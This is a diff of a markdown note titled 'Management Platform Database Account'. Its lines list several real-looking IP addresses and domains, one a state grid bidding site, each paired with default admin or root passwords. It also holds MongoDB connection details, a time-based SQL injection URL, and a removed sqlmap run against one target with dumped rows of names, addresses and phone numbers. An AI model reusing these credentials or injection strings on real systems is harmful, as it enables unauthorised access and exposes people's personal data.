@@ -1,47 +1,37 @@
 ---
 title: "Management Platform Database Account"
-date: 2023-05-08 23:13:37
-author: congraTao@uio.com.cn
+date: 2023-05-11 12:00:01
+author: config.bak@uio.com.cn
+
+## IOT Management Password 
+
+https://www.jsendata.cn admin/admin 
+
+https://43.138.26.254  admin/admin
+
+https://218.22.14.11:10082  admin/admin
+
+https://61.182.207.137:10443  admin/ p@ssword_123
+
+https://bid.js.sgcc.com.cn/ admin/admin123
+
+https://www.jsendata.cn/big_data-open/newDetails?id=1'-SLEEP(1)=0 LIMIT 1 --
 
 
-root@kali:~/sqlmap-dev$ python sqlmap.py -u 'https://bid.js.sgcc.com.cn/tyzb/tyzb2.0/fwdt/index.html#/notice/list?id=2' --tables
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-[*] starting at 13:37:00
+## Navicat Account 1
+host            : '218.22.14.11’,
+port		: '27017',
+user            : 'root',
+password        : 'root',
+Database        : 'admin'
 
-[13:37:00] [INFO] testing connection to the target URL 
-+----+--------------+----------------------+----------+-------------+------------+-----------+-----+
-| ID | name         | address              | zip code | phone       | city       | country   | SID |
-+----+--------------+----------------------+----------+-------------+------------+-----------+-----+
-|  1 | root         | 23 Workhaven Lane    |  200012  | 1378871902  | city_no_01 |  AnHui    |   1 |
-|  2 | admin        | 1411 Lillydale Drive |  200013  | 1256872443  | city_no_02 |  TianJing |   2 |
-+----+--------------+----------------------+----------+-------------+------------+-----------+-----+
- 
-  ## Navicat Account 1
-  host            : '218.22.14.11’,
-  port		  : '27017',
-  user            : 'root',
-  password        : 'root',
-  database        : 'admin'
-+------------+------------------+
-| Manager ID | Workers          |
-+------------+------------------+
-|       NULL | Andrew Fuller    |
-|          2 | Nancy Davolio    |
-|          2 | Janet Leverling  |
-|          2 | Margaret Peacock |
-|          2 | Steven Buchanan  |
-|          2 | Laura Callahan   |
-|          5 | Michael Suyama   |
-|          5 | Robert King      |
-|          5 | Anne Dodsworth   |
-+------------+------------------+
+## Navicat Account 2
+host            : '43.138.26.254’,
+port		: '27017',
+user            : 'root',
+password        : 'root',
+Database        : 'root'
 
- ## Navicat Account 2
-  host            : '43.138.26.254’,
-  port		  : '27017',
-  user            : 'root',
-  password        : 'root',
-  database        : 'root'
 +------------+------------------+
 | Manager ID | Workers          |
 +------------+------------------+
